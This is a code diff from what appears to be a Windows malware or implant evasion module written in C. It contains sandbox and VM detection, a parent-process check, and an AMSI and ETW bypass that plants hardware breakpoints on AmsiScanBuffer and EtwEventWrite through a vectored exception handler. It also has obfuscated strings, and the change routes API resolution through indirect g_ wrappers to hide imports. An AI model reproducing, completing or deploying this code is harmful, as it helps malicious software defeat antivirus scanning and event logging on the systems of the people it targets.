@@ -41,8 +41,8 @@ BOOL IsVM(void) {
     typedef LONG (WINAPI *pfnRegOpenKeyExA)(HKEY,LPCSTR,DWORD,REGSAM,PHKEY);
     static pfnRegOpenKeyExA pOpen = NULL;
     if (!pOpen) {
-        HMODULE h = LoadLibraryA(OBFSTR("advapi32.dll"));
-        if (h) pOpen = (pfnRegOpenKeyExA)(FARPROC)GetProcAddress(h, OBFSTR("RegOpenKeyExA"));
+        HMODULE h = g_LoadLibraryA(OBFSTR("advapi32.dll"));
+        if (h) pOpen = (pfnRegOpenKeyExA)(FARPROC)g_GetProcAddress(h, OBFSTR("RegOpenKeyExA"));
     }
     if (pOpen) {
         const char *keys[] = {
@@ -54,8 +54,8 @@ BOOL IsVM(void) {
         typedef LONG (WINAPI *pfnRegCloseKey)(HKEY);
         static pfnRegCloseKey pClose = NULL;
         if (!pClose) {
-            HMODULE h = GetModuleHandleA(OBFSTR("advapi32.dll"));
-            if (h) pClose = (pfnRegCloseKey)(FARPROC)GetProcAddress(h, OBFSTR("RegCloseKey"));
+            HMODULE h = g_GetModuleHandleA(OBFSTR("advapi32.dll"));
+            if (h) pClose = (pfnRegCloseKey)(FARPROC)g_GetProcAddress(h, OBFSTR("RegCloseKey"));
         }
         for (int i = 0; i < (int)ARRAY_SIZE(keys); i++) {
             HKEY hk;
@@ -110,9 +110,9 @@ static BOOL SuspiciousParent(void) {
 
     char path[MAX_PATH] = {0};
     DWORD plen = MAX_PATH;
-    HMODULE k32 = GetModuleHandleA(OBFSTR("kernel32.dll"));
+    HMODULE k32 = g_GetModuleHandleA(OBFSTR("kernel32.dll"));
     typedef BOOL (WINAPI *pfnQFPI)(HANDLE, DWORD, LPSTR, PDWORD);
-    pfnQFPI pFn = k32 ? (pfnQFPI)(FARPROC)GetProcAddress(k32, OBFSTR("QueryFullProcessImageNameA")) : NULL;
+    pfnQFPI pFn = k32 ? (pfnQFPI)(FARPROC)g_GetProcAddress(k32, OBFSTR("QueryFullProcessImageNameA")) : NULL;
     BOOL got = pFn ? pFn(hParent, 0, path, &plen) : FALSE;
     CloseHandle(hParent);
     if (!got || !plen) return FALSE;
@@ -277,10 +277,10 @@ static LONG WINAPI EvasionVEH(PEXCEPTION_POINTERS ep) {
 static void SetHWBP(DWORD64 addr, int drIdx) {
     typedef NTSTATUS (WINAPI *pfnNtGetCtx)(HANDLE, PCONTEXT);
     typedef NTSTATUS (WINAPI *pfnNtSetCtx)(HANDLE, PCONTEXT);
-    HMODULE ntdll = GetModuleHandleA(OBFSTR("ntdll.dll"));
+    HMODULE ntdll = g_GetModuleHandleA(OBFSTR("ntdll.dll"));
     if (!ntdll) return;
-    pfnNtGetCtx pGet = (pfnNtGetCtx)(FARPROC)GetProcAddress(ntdll, OBFSTR("NtGetContextThread"));
-    pfnNtSetCtx pSet = (pfnNtSetCtx)(FARPROC)GetProcAddress(ntdll, OBFSTR("NtSetContextThread"));
+    pfnNtGetCtx pGet = (pfnNtGetCtx)(FARPROC)g_GetProcAddress(ntdll, OBFSTR("NtGetContextThread"));
+    pfnNtSetCtx pSet = (pfnNtSetCtx)(FARPROC)g_GetProcAddress(ntdll, OBFSTR("NtSetContextThread"));
     if (!pGet || !pSet) return;
     CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
     HANDLE hThr = (HANDLE)(LONG_PTR)-2;
@@ -300,16 +300,16 @@ BOOL EvasionInit(void) {
     if (!AddVectoredExceptionHandler(1, EvasionVEH)) return FALSE;
 
     /* 3. AMSI */
-    HMODULE amsi = LoadLibraryA(OBFSTR("amsi.dll"));
+    HMODULE amsi = g_LoadLibraryA(OBFSTR("amsi.dll"));
     if (amsi) {
-        s_amsi_addr = (PVOID)GetProcAddress(amsi, OBFSTR("AmsiScanBuffer"));
+        s_amsi_addr = (PVOID)g_GetProcAddress(amsi, OBFSTR("AmsiScanBuffer"));
         if (s_amsi_addr) SetHWBP((DWORD64)s_amsi_addr, 0);
     }
 
     /* 4. ETW */
-    HMODULE ntdll = GetModuleHandleA(OBFSTR("ntdll.dll"));
+    HMODULE ntdll = g_GetModuleHandleA(OBFSTR("ntdll.dll"));
     if (ntdll) {
-        s_etw_addr = (PVOID)GetProcAddress(ntdll, OBFSTR("EtwEventWrite"));
+        s_etw_addr = (PVOID)g_GetProcAddress(ntdll, OBFSTR("EtwEventWrite"));
         if (s_etw_addr) SetHWBP((DWORD64)s_etw_addr, 1);
     }
     return TRUE;
